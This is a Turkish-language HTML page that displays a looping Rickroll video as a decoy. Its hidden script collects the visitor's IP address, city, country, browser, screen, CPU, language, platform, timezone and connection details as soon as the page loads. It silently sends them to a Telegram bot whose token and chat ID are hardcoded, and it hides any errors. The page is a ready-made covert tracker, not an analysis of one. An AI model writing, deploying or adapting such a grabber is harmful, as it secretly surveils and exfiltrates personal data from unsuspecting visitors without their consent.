<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Gizli Veri Toplama & Rickroll</title>
  <style>
    /* Sayfa tam ekran, Rick video arka plan */
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
      background: black;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #rickrollVideo {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      object-fit: cover;
      z-index: 0;
      pointer-events: none;
    }
    #overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.3);
      z-index: 1;
    }
  </style>
</head>
<body>
  <video id="rickrollVideo" autoplay muted loop>
    <source src="https://cdn.pixabay.com/vimeo/592142858/Rickroll.mp4" type="video/mp4" />
    Tarayıcınız video etiketini desteklemiyor.
  </video>
  <div id="overlay"></div>

  <script>
    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Senin chat ID'in
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch(e) {
        // Hata sessiz geç
      }
    }

    async function collectData() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const cores = navigator.hardwareConcurrency || 'Bilinmiyor';
        const pixelRatio = window.devicePixelRatio || 1;
        const timezoneOffset = -new Date().getTimezoneOffset() / 60;
        const language = navigator.language || 'Bilinmiyor';
        const platform = navigator.platform || 'Bilinmiyor';
        const cookiesEnabled = navigator.cookieEnabled ? 'Aktif' : 'Kapalı';
        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor';

        const message = `Gizli Veri Toplama:\n` +
          `IP: ${data.ip}\n` +
          `Şehir: ${data.city}\n` +
          `Ülke: ${data.country_name}\n` +
          `Tarayıcı: ${navigator.userAgent}\n` +
          `Ekran Çözünürlüğü: ${screen.width}x${screen.height}\n` +
          `Piksel Yoğunluğu: ${pixelRatio}\n` +
          `CPU Çekirdeği: ${cores}\n` +
          `Dil: ${language}\n` +
          `Platform: ${platform}\n` +
          `Zaman Dilimi: UTC${timezoneOffset}\n` +
          `Çerez İzinleri: ${cookiesEnabled}\n` +
          `Bağlantı Tipi: ${connectionType}`;

        await sendToTelegram(message);
      } catch(e) {
        // Hata sessiz geç
      }
    }

    collectData();
  </script>
</body>
</html>
